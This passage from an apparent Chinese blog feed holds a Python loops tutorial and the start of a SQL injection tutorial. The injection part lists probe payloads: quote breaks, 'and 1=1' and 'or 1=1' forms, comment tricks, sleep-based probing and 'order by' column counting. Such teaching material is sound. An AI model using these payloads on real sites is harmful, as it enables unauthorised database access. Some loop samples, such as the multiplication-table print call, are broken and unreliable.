operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token builtin\">sum</span><span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">while</span> i<span class=\"token operator\">&lt;=</span><span class=\"token number\">100</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token builtin\">sum</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">sum</span> <span class=\"token operator\">+</span> i</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    i<span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">sum</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>计算<span class=\"token number\">1</span><span class=\"token operator\">~</span><span class=\"token number\">100</span>之间偶数的累积和（包含<span class=\"token number\">1</span>和<span class=\"token number\">100</span>）</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>i <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token builtin\">sum</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">while</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">100</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">if</span> i <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token builtin\">sum</span> <span class=\"token operator\">+=</span> i</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    i<span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr></table></figure><p><strong>while 嵌套</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">while</span> 条件<span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        条件<span class=\"token number\">1</span>满足时，做的事情<span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        条件<span class=\"token number\">1</span>满足时，做的事情<span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        条件<span class=\"token number\">1</span>满足时，做的事情<span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span>省略<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">while</span> 条件<span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            条件<span class=\"token number\">2</span>满足时，做的事情<span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            条件<span class=\"token number\">2</span>满足时，做的事情<span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            条件<span class=\"token number\">2</span>满足时，做的事情<span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span>省略<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>要求：打印如下图形：</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">*</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token operator\">*</span> <span class=\"token operator\">*</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token operator\">*</span> <span class=\"token operator\">*</span> <span class=\"token operator\">*</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token operator\">*</span> <span class=\"token operator\">*</span> <span class=\"token operator\">*</span> <span class=\"token operator\">*</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>i <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">while</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    f <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">while</span> f <span class=\"token operator\">&lt;=</span> i<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"*\"</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        f <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>打印九九乘法表</pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>i<span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">while</span> i<span class=\"token operator\">&lt;=</span><span class=\"token number\">9</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    t<span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">while</span> t<span class=\"token operator\">&lt;=</span>i<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d*%d=%d\"</span><span class=\"token punctuation\">,</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span>t<span class=\"token operator\">*</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>end<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        t<span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    i<span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>第一遍循环i<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;=</span><span class=\"token number\">9</span>满足条件，t赋值为<span class=\"token number\">1</span>进入第二个循环t<span class=\"token operator\">&lt;=</span>i满足条件打印<span class=\"token number\">1</span><span class=\"token operator\">*</span><span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token punctuation\">,</span>然后t<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span> 目前i<span class=\"token operator\">=</span><span class=\"token number\">1</span> t<span class=\"token operator\">=</span><span class=\"token number\">2</span>不满足t<span class=\"token operator\">&lt;=</span>i的条件停止循环退出循环\\n换行<span class=\"token punctuation\">,</span>然后i<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span>满足i<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;=</span><span class=\"token number\">9</span>的</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>条件进行第二次循环<span class=\"token punctuation\">,</span>t<span class=\"token operator\">=</span><span class=\"token number\">1</span>重新把t赋值为<span class=\"token number\">1</span>，此时i<span class=\"token operator\">=</span><span class=\"token number\">2</span> t<span class=\"token operator\">=</span><span class=\"token number\">1</span> t<span class=\"token operator\">&lt;=</span>i满足第二个循环体的条件</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>打印<span class=\"token number\">1</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">=</span><span class=\"token number\">2</span> 然后t<span class=\"token operator\">+</span><span class=\"token number\">1</span> 现在i<span class=\"token operator\">=</span><span class=\"token number\">2</span> t<span class=\"token operator\">=</span><span class=\"token number\">2</span> 满足第二循环体的条件t<span class=\"token operator\">&lt;=</span>i继续循环<span class=\"token punctuation\">,</span>打印<span class=\"token number\">2</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">=</span><span class=\"token number\">4</span> 然</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>后t<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">3</span> 现在i<span class=\"token operator\">=</span><span class=\"token number\">2</span> t<span class=\"token operator\">=</span><span class=\"token number\">3</span>明显不满足第二循环体的条件退出第二循环体换行，然后i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>满足第一循环体的条件i<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;=</span><span class=\"token number\">9</span>继续循环t再次赋值为<span class=\"token number\">1</span>以此类推</pre></td></tr></table></figure><p><strong>for 循环</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span>循环</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>像<span class=\"token keyword\">while</span>循环一样，<span class=\"token keyword\">for</span>可以完成循环的功能。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>在Python中 <span class=\"token keyword\">for</span>循环可以遍历任何序列的项目，如一个列表或者一个字符串等</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">for</span> 临时变量 <span class=\"token keyword\">in</span> 列表或者字符串等可迭代对象<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    循环满足条件时执行的代码</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>i <span class=\"token operator\">=</span> <span class=\"token string\">\"hello\"</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> i<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>i <span class=\"token operator\">=</span> <span class=\"token string\">\"hello\"</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> i<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span> x<span class=\"token operator\">==</span> <span class=\"token string\">\"l\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>x<span class=\"token operator\">=</span><span class=\"token string\">\"hello\"</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">for</span><span class=\"token operator\">-</span><span class=\"token keyword\">else</span>语句</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>account<span class=\"token operator\">=</span><span class=\"token string\">\"wyw\"</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>pwd<span class=\"token operator\">=</span><span class=\"token string\">'123'</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    zh<span class=\"token operator\">=</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'请输入账号'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    mi <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'请输入密码'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">if</span> account<span class=\"token operator\">==</span>zh <span class=\"token keyword\">and</span> pwd<span class=\"token operator\">==</span>mi<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'恭喜登录成功'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'您的账号以锁定'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"break和continue\"><a class=\"markdownIt-Anchor\" href=\"#break和continue\">#</a> break 和 continue</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>普通<span class=\"token keyword\">while</span>语句</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>i<span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">while</span> i<span class=\"token operator\">&lt;=</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    i<span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"没有使用break语句打印此语句\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>结果<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>没有使用<span class=\"token keyword\">break</span>语句打印此语句</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">while</span> i<span class=\"token operator\">&lt;</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    i <span class=\"token operator\">=</span> i<span class=\"token operator\">+</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'----'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">if</span> i<span class=\"token operator\">==</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"没有使用break语句打印此语句\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>结果<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">break</span>的作用：立刻结束<span class=\"token keyword\">break</span>所在的循环</pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>带有<span class=\"token keyword\">continue</span>的循环示例如下<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">while</span> i<span class=\"token operator\">&lt;</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    i <span class=\"token operator\">=</span> i<span class=\"token operator\">+</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">if</span> i<span class=\"token operator\">==</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>结果<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">continue</span>的作用：用来结束本次循环，紧接着执行下一次的循环，相当于跳过了当前这次循环</pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token keyword\">break</span><span class=\"token operator\">/</span><span class=\"token keyword\">continue</span>只能用在循环中，除此以外不能单独使用</pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">break</span><span class=\"token operator\">/</span><span class=\"token keyword\">continue</span>在嵌套循环中，只对最近的一层循环起作用</pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/10/28/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/",
            "url": "http://gyzero.shop/2023/10/28/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/",
            "title": "sql注入",
            "date_published": "2023-10-28T11:09:44.000Z",
            "content_html": "<div class=\"note info\">\n<p>对 mysql 不了解的不会语句的去看数据库篇</p>\n</div>\n<h3 id=\"mysql数据库结构\"><a class=\"markdownIt-Anchor\" href=\"#mysql数据库结构\">#</a> <span class=\"kbd\">mysql 数据库结构</span></h3>\n<p>mysql15 以后默认存放一个 infomation_schema 里面 这个库里面有很多表 重点是这三个表 columns 、tables、schemata 表字段 CHEMA_NAME 记录着库的信息</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero1.png\" alt=\"\"></p>\n<p>tables 表字段 TABLE_SCHEMA 、TABLE_NAME 分别记录着库名和表名</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero2.png\" alt=\"\"></p>\n<p>columns 存储该用户创建的所有数据库的库名、标名和字段名</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero3.png\" alt=\"\"></p>\n<p>查询 admin 库中所有表字段</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero4.png\" alt=\"\"></p>\n<p>查询某个库某个表的字段可以这样查询</p>\n<p>select * from information_schema.COLUMNS where TABLE_SCHEMA=‘admin’ and</p>\n<p>TABLE_NAME=‘admin’</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero5.png\" alt=\"\"></p>\n<h3 id=\"2sql注入原理\"><a class=\"markdownIt-Anchor\" href=\"#2sql注入原理\">#</a> <span class=\"kbd\">2.sql 注入原理</span></h3>\n<p>SQL 注入漏洞的产生需要满足以下两个条件  参数用户可控：从前端传给后端的参数内容是用户可以控制的  参数带入数据库查询：传入的参数拼接到 SQL 语句，且带入数据库查询。</p>\n<p>当用户传入参数为 1’的时候，在数据库执行如下所示。</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' 此 SQL 语句不符合语法规则就会报错。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>You have an error in your SQL syntax; check the manual that corresponds</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>to your MySQL server version for the right syntax to use near '''</span> at line <span class=\"token number\">1</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>当用户传入参数为 <span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> 时 <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> 因为 <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> 为真</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token number\">1</span> 也是真 <span class=\"token operator\">and</span> 两边均为真 所以页面会返回 id<span class=\"token operator\">=</span><span class=\"token number\">1</span> 的结果。 如果用户传入参数为 <span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span> 时</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>因为 <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span> 为假 id<span class=\"token operator\">=</span><span class=\"token number\">1</span> 为真 <span class=\"token operator\">and</span> 两边有一个为假，所以页面返回与 id<span class=\"token operator\">=</span><span class=\"token number\">1</span> 不一样的结果。</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>由此可以初步判断存在 <span class=\"token keyword\">SQL</span> 注入漏洞，攻击者可以进一步拼接  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token string\">'1'</span> <span class=\"token operator\">or</span> <span class=\"token string\">'1'</span> <span class=\"token operator\">=</span> <span class=\"token string\">'1'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token string\">\"1\"</span> <span class=\"token operator\">or</span> <span class=\"token string\">\"1\"</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"1\"</span></pre></td></tr></table></figure><p>判断页面是否不一样，还有无回显的情况输入语句页面没有变化但实际上执行了这种还有延时注入给拼接语句时 sleep 5 看页面是不是 5 秒后显示的</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">sql</span>注释符</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token comment\"># 单行注释 url 编码 %23</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*  */</span> 多行注释 <span class=\"token comment\">/**/</span>当空格用</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">--\"空格\" 单行注释</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">--+ 也可以</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>是否存在注入判断注入的类型是什么</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>判断字段数 <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span></pre></td></tr><tr><td 